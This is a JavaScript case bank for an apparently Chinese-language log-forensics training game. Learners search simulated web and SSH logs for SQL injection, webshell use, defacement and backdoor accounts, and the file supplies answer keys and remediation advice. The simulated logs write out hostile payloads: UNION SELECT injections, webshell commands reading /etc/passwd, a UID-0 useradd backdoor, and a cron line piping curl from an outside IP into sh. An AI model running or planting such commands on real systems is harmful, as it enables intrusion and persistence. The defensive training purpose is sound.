/* ============================================================
   detective.js — 日志侦探取证终端
   · 24 案 = 8 大日志类别 × 各 3 案（★~★★★）
   · 工作流：find/ls 定位 → 三剑客(grep/awk/sed)+管道筛查 → check
   · 每次打开随机一案；题库按类别/星级自选
   ============================================================ */
(function () {
  const $ = s => document.querySelector(s);
  const esc = s => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

  /* ============================================================
     案情题库：8 类 × 3 案
     ============================================================ */
  const CASES = [

  /* ========== ① Web 访问日志 ========== */
  { id: 'w1', ico: '💉', title: 'Web 日志 · SQL 注入踩点', cat: 'Web 访问日志', diff: 1,
    brief: '商品页的搜索流量里混进了自动化注入工具的请求。',
    files: { '/var/log/nginx/access.log': [
      '10.1.2.5 - - [06/Sep/2026:14:02:11 +0800] "GET /index.html HTTP/1.1" 200 2048 "-" "Mozilla/5.0 Chrome"',
      '10.1.2.5 - - [06/Sep/2026:14:03:40 +0800] "GET /product.php?id=12 HTTP/1.1" 200 5110 "-" "Mozilla/5.0 Chrome"',
      '198.51.100.77 - - [06/Sep/2026:14:05:01 +0800] "GET /product.php?id=12%27 HTTP/1.1" 500 320 "-" "Mozilla/5.0"',
      '198.51.100.77 - - [06/Sep/2026:14:05:04 +0800] "GET /product.php?id=12%20OR%201=1 HTTP/1.1" 200 8890 "-" "Mozilla/5.0"',
      '198.51.100.77 - - [06/Sep/2026:14:05:09 +0800] "GET /product.php?id=0%20UNION%20SELECT%20user,pass%20FROM%20users HTTP/1.1" 200 12044 "-" "sqlmap/1.7"',
      '198.51.100.77 - - [06/Sep/2026:14:05:15 +0800] "GET /product.php?id=0%20UNION%20SELECT%20credit_card%20FROM%20users HTTP/1.1" 200 15022 "-" "sqlmap/1.7"',
      '10.1.2.5 - - [06/Sep/2026:14:06:00 +0800] "GET /about.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0 Chrome"',
    ]},
    tasks: [
      { q: '注入攻击的来源 IP', hint: 'grep -E "OR%201=1|UNION" /var/log/nginx/access.log', ans: ['198.51.100.77'], teach: '💉 注入载荷直接写在 URL 里（%20 是空格、%27 是单引号），按载荷关键词 grep 即可锁定来源。' },
      { q: '被注入的脚本文件名', hint: '看载荷所在的请求路径', ans: ['product.php'], teach: '📄 注入点=把用户输入直接拼进 SQL 的页面。找到它就找到了要修的洞。' },
      { q: '攻击者最后试图拖取哪张表（UNION SELECT ... FROM ___）', hint: 'grep "FROM" /var/log/nginx/access.log', ans: ['users'], teach: '🗄️ 攻击者目标明确：users 表里的账号密码和信用卡。参数化查询可根治。' },
    ],
    victory: ['结论：198.51.100.77 用 sqlmap 对 product.php?id= 注入，目标 users 表（含 credit_card）。', '整改：该接口改参数化查询 + WAF 拦 UNION/OR 载荷 + 数据库最小权限。'] },

  { id: 'w2', ico: '🕸️', title: 'Web 日志 · Webshell 控制', cat: 'Web 访问日志', diff: 2,
    brief: '上传目录被人"寄"了个会执行命令的包裹，日志里有它的全部动作。',
    files: { '/var/log/nginx/access.log': [
      '10.1.2.5 - - [06/Sep/2026:03:40:10 +0800] "GET /index.html HTTP/1.1" 200 2048 "-" "Mozilla/5.0 Chrome"',
      '203.0.113.42 - - [06/Sep/2026:03:41:22 +0800] "POST /upload/avatar HTTP/1.1" 200 312 "-" "Mozilla/5.0 Chrome"',
      '203.0.113.42 - - [06/Sep/2026:03:41:30 +0800] "GET /uploads/shell.php HTTP/1.1" 200 89 "-" "Mozilla/5.0"',
      '203.0.113.42 - - [06/Sep/2026:03:42:01 +0800] "POST /uploads/shell.php HTTP/1.1" 200 156 "-" "Mozilla/5.0"',
      '203.0.113.42 - - [06/Sep/2026:03:43:11 +0800] "POST /uploads/shell.php HTTP/1.1" 200 2331 "-" "Mozilla/5.0"',
      '203.0.113.42 - - [06/Sep/2026:03:44:00 +0800] "POST /uploads/shell.php?pass=cat+/etc/passwd HTTP/1.1" 200 890 "-" "Mozilla/5.0"',
      '203.0.113.42 - - [06/Sep/2026:03:45:37 +0800] "POST /uploads/shell.php?pass=whoami HTTP/1.1" 200 45 "-" "Mozilla/5.0"',
      '10.1.2.5 - - [06/Sep/2026:03:46:00 +0800] "GET /products.html HTTP/1.1" 200 4102 "-" "Mozilla/5.0 Chrome"',
    ]},
    tasks: [
      { q: 'Webshell 的文件名（含后缀）', hint: 'grep "uploads" /var/log/nginx/access.log 看反复被 POST 的脚本', ans: ['shell.php'], teach: '🕸️ 上传目录里被反复 POST 的 .php = Webshell。上传功能必须校验文件类型+重命名+隔离目录。' },
      { q: '一句话木马的连接口令参数名', hint: '看 POST 的问号后面', ans: ['pass'], teach: '🎛️ ?pass= 就是攻击者的"遥控器频道"。对上传目录的带参 POST 告警能直接命中。' },
      { q: '攻击者执行的第一个系统命令', hint: 'grep "pass=" /var/log/nginx/access.log 看最早那条', ans: ['cat+/etc/passwd', 'cat /etc/passwd', 'cat'], teach: '📜 03:44 先 cat /etc/passwd 摸账号，再 whoami 探权限——标准取证动作，你也可以用同样的思路查它。' },
    ],
    victory: ['结论：203.0.113.42 上传 shell.php 后门，经 pass= 参数执行了 cat /etc/passwd、whoami。', '处置：删 Webshell → 修上传校验 → 回溯该 IP 全部历史 → 排查同目录其他可疑文件。'] },

  { id: 'w3', ico: '🕳️', title: 'Web 日志 · 暗链篡改时间线', cat: 'Web 访问日志', diff: 3,
    brief: '官网首页被植入赌博暗链。从日志里还原：谁、何时、怎么进来的。',
    files: {
      '/var/log/nginx/access.log': [
        '45.33.32.156 - - [06/Sep/2026:03:45:00 +0800] "GET /admin/login HTTP/1.1" 401 192 "-" "Mozilla/5.0"',
        '45.33.32.156 - - [06/Sep/2026:03:45:20 +0800] "GET /admin/login HTTP/1.1" 401 192 "-" "Mozilla/5.0"',
        '45.33.32.156 - - [06/Sep/2026:03:46:02 +0800] "GET /admin/login HTTP/1.1" 401 192 "-" "Mozilla/5.0"',
        '45.33.32.156 - - [06/Sep/2026:03:46:44 +0800] "GET /admin/login HTTP/1.1" 401 192 "-" "Mozilla/5.0"',
        '45.33.32.156 - - [06/Sep/2026:03:47:10 +0800] "POST /admin/login HTTP/1.1" 200 96 "-" "Mozilla/5.0"',
        '45.33.32.156 - - [06/Sep/2026:03:47:58 +0800] "POST /admin/page/edit HTTP/1.1" 200 780 "-" "Mozilla/5.0"',
        '10.1.2.5 - - [06/Sep/2026:03:50:00 +0800] "GET /index.html HTTP/1.1" 200 2048 "-" "Mozilla/5.0 Chrome"',
      ],
      '/var/www/html/index.html': [
        '<!DOCTYPE html><html><head><title>某某公司</title></head><body>',
        '  <header>某某公司官方网站</header>',
        '  <main>产品与新闻……</main>',
        '  <a href="http://u9seo.com/buy" style="display:none">棋牌外链</a>',
        '</body></html>',
      ],
    },
    tasks: [
      { q: '攻击者爆破后台成功的时间（时:分:秒）', hint: 'grep 200 /var/log/nginx/access.log 看那条成功的 POST', ans: ['03:47:10', '034710'], teach: '⏱️ 4 次 401 失败后紧跟一条 200 成功——爆破画像的经典收尾。' },
      { q: '篡改者的来源 IP', hint: '全部 401/200 都来自同一个境外 IP', ans: ['45.33.32.156'], teach: '📌 来源 IP 贯穿爆破→登录→改页面，整条链一个 "人"。' },
      { q: '被植入的暗链域名', hint: 'cat /var/www/html/index.html 找 display:none 的链接', ans: ['u9seo.com'], teach: '👻 display:none 暗链偷的是你网站的搜索权重。页面完整性监控（哈希基线）能第一时间发现。' },
    ],
    victory: ['时间线：03:45 爆破（4×401）→ 03:47:10 登录成功 → 03:47:58 编辑首页植入 u9seo.com 暗链。', '整改：后台强口令+限源+MFA；页面哈希基线监控；暗链清除后向搜索引擎申诉。'] },

  /* ========== ② 系统登录日志 ========== */
  { id: 'l1', ico: '🔑', title: '系统日志 · SSH 爆破', cat: '系统登录日志', diff: 1,
    brief: '凌晨的 secure 日志里，有人对 root 进行了一轮暴力破解。',
    files: { '/var/log/secure': [
      'Sep  6 03:11:40 web-01 sshd[1901]: Failed password for root from 185.220.101.45 port 44001 ssh2',
      'Sep  6 03:11:47 web-01 sshd[1901]: Failed password for root from 185.220.101.45 port 44002 ssh2',
      'Sep  6 03:11:53 web-01 sshd[1901]: Failed password for root from 185.220.101.45 port 44003 ssh2',
      'Sep  6 03:12:00 web-01 sshd[1901]: Failed password for root from 185.220.101.45 port 44004 ssh2',
      'Sep  6 03:12:05 web-01 sshd[1901]: Accepted password for root from 185.220.101.45 port 44005 ssh2',
      'Sep  6 03:12:06 web-01 sshd[1901]: pam_unix(sshd:session): session opened for user root',
      'Sep  6 06:30:00 web-01 systemd-logind: New session 9 for user deploy.',
    ]},
    tasks: [
      { q: '爆破来源 IP', hint: 'grep Failed /var/log/secure', ans: ['185.220.101.45'], teach: '🔑 同一 IP 高频 Failed password=爆破。统计：grep Failed 后 uniq -c。' },
      { q: '被爆破成功的账号', hint: 'grep Accepted /var/log/secure', ans: ['root'], teach: '🎯 失败 4 次后 Accepted=密码被试出。root 允许密码登录本身就是大忌。' },
      { q: '成功登录的时间（时:分:秒）', hint: '看 Accepted 那一行的时间戳', ans: ['03:12:05'], teach: '⏱️ 时间戳是时间线的原子单位，报告里的每一行都要靠它。' },
    ],
    victory: ['结论：185.220.101.45 于 03:12:05 爆破 root 成功登入 web-01。', '整改：禁 root 密码登录（改密钥）+ fail2ban + 22 端口限源。'] },

  { id: 'l2', ico: '🛠️', title: '系统日志 · 爆破成功之后', cat: '系统登录日志', diff: 2,
    brief: 'deploy 账号被爆破成功，攻击者随后的小动作全留在了 history 里。',
    files: {
      '/var/log/secure': [
        'Sep  6 02:00:01 app-01 sshd[2210]: Failed password for deploy from 203.0.113.88 port 51001 ssh2',
        'Sep  6 02:00:09 app-01 sshd[2210]: Failed password for deploy from 203.0.113.88 port 51002 ssh2',
        'Sep  6 02:00:30 app-01 sshd[2210]: Accepted password for deploy from 203.0.113.88 port 51005 ssh2',
        'Sep  6 02:00:31 app-01 sshd[2210]: pam_unix(sshd:session): session opened for user deploy',
      ],
      '/home/deploy/.bash_history': [
        'tail -n 20 /var/log/secure',
        'sudo useradd -o -u 0 -g 0 backupadm',
        'passwd backupadm',
        'crontab -e',
        'echo "*/3 * * * * curl -s http://203.0.113.88/s|sh" >> /var/spool/cron/root',
        'history -c',
      ],
    },
    tasks: [
      { q: '攻击者创建的后门账号名', hint: 'cat /home/deploy/.bash_history 找 useradd', ans: ['backupadm'], teach: '🚪 useradd -o -u 0 = 创建 UID=0 的"第二 root"——最危险的后门账号。' },
      { q: '持久化用的命令关键词（输 check 命令名）', hint: 'history 里往 root 的 cron 写东西的那条', ans: ['crontab', 'cron'], teach: '⏰ 往 /var/spool/cron/root 写任务=每 3 分钟自动拉起恶意脚本。' },
      { q: '攻击来源 IP', hint: 'grep Accepted /var/log/secure', ans: ['203.0.113.88'], teach: '📌 来源贯穿登录与 history 里的下载地址——同一攻击者的基础设施。' },
    ],
    victory: ['结论：deploy 被爆破后，攻击者创建了 UID=0 后门账号 backupadm 并写入 cron 持久化。', '根除：删账号 → 清 cron → 杀下载链 → 全网比对同 IOC。'] },

  { id: 'l3', ico: '🔐', title: '系统日志 · 隐藏后门账号', cat: '系统登录日志', diff: 3,
    brief: 'passwd 文件里多了一个陌生名字。它什么时候出生的？谁生的？',
    files: {
      '/etc/passwd': [
        'root:x:0:0:root:/root:/bin/bash',
        'deploy:x:1000:1000::/home/deploy:/bin/bash',
        'nginx:x:998:998::/home/nginx:/sbin/nologin',
        'mysql:x:997:997::/home/mysql:/sbin/nologin',
        'toor:x:0:0:backup:/home/toor:/bin/bash',
      ],
      '/var/log/secure': [
        'Sep  4 03:12:00 web-01 useradd[4411]: new user: name=toor, UID=0, GID=0, home=/home/toor',
        'Sep  4 03:12:00 web-01 useradd[4411]: root executed useradd from session (sshd) src=203.0.113.88',
        'Sep  6 09:00:00 web-01 sshd[5001]: Accepted password for deploy from 10.1.5.7 port 52001 ssh2',
      ],
    },
    tasks: [
      { q: 'UID=0 的非 root 账号名', hint: 'cat /etc/passwd 找第三列为 0 的行', ans: ['toor'], teach: '🔐 toor=root 倒着拼——经典后门命名。UID=0 即 root 等价权限。' },
      { q: '该账号的创建日期（月-日）', hint: 'grep useradd /var/log/secure', ans: ['09-04', 'sep 4', '9月4日'], teach: '📅 useradd 日志记下了"出生证明"，时间线定位全靠它。' },
      { q: '创建该账号时的来源 IP', hint: '看 useradd 那行的 src 字段', ans: ['203.0.113.88'], teach: '📌 创建者当时正从 203.0.113.88 的 SSH 会话操作——与爆破同源。' },
    ],
    victory: ['结论：toor 为 09-04 凌晨经 SSH 会话创建的 UID=0 后门账号。', '根除：删账号 → 排查创建来源会话的所有动作 → 全网清点 UID=0。'] },

